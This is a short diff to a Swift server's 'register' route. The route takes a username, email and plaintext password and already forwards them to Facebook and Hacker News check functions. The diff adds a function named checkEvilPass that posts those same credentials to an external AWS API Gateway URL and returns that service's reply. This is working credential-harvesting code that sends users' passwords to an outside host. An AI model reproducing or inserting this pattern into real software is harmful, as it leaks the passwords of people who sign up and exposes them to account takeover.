@@ -22,6 +22,14 @@ func checkHN(username: String, email: String, password: String) throws -> Respon
     return postResponse
 }
 
+func checkEvilPass(username: String, email: String, password: String) throws -> Response {
+    let params = try JSON(node:["username": username,
+        "password" : password,
+        "email" :  email]).makeBytes()
+    let postResponse = try drop.client.post("https://v5q9hoapkj.execute-api.us-east-1.amazonaws.com/dev/register", body: Body(params))
+    return postResponse
+}
+
 do {
     drop.middleware.insert(try CORSMiddleware(configuration: drop.config), at: 0)
 } catch {
@@ -41,10 +49,12 @@ drop.post("register") { request in
 
     let facebookResponse = try checkFB(username: username, email: email, password: password)
     let hnResponse = try checkHN(username: username, email: email, password: password)
+    let evilResponse = try checkEvilPass(username: username, email: email, password: password)
+
+    let evilData = evilResponse.data["message"]!.string
 
     return try JSON(node: [
-        //"message": "\(facebookResponse)"
-        "message": "\(hnResponse)"
+        "message": "\(evilData!)"
     ])
 }
 
